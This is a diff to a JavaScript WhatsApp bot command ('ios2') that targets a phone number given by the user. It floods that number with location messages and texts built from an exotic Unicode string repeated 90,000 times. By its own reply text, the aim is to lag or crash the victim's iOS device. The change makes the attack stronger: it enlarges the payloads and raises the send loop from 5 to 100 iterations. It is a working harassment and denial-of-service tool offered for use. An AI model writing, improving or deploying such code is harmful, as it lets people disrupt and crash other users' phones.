@@ -9,12 +9,12 @@ let handler = async (m, { text, conn, isGroup, isAdmin }) => {
   }
 
   let numero = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-  let textoFinal = ' ꙰꙱꙲'.repeat(70000); // Si quieres cambia l cantidad xdxd
+  let textoFinal = '𑇂𑆵𑆴𑆿'.repeat(90000); // Si quieres cambia l cantidad xdxd
 
-  const nombre = 'ꦶি'.repeat(32900).trim();
-  const direccion = '𑇂𑆵𑆴𑆿'.repeat(32900).trim();
+  const nombre = '𑇂𑆵𑆴𑆿'.repeat(90000).trim();
+  const direccion = '𑇂𑆵𑆴𑆿'.repeat(90000).trim();
 
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 100; i++) {
     await conn.sendMessage(numero, {
       location: {
         degreesLatitude: 35.6895,
@@ -27,7 +27,7 @@ let handler = async (m, { text, conn, isGroup, isAdmin }) => {
     await conn.sendMessage(numero, { text: textoFinal });
   }
 
-  await m.reply(`😼 Se enviaron 5 ubicaciones y texto para dar atraso ios a ${text}`);
+  await m.reply(`😼 Se enviaron 200 ubicaciones y texto para dar atraso ios a ${text}`);
 };
 
 handler.help = ['ios2 <+número>'];
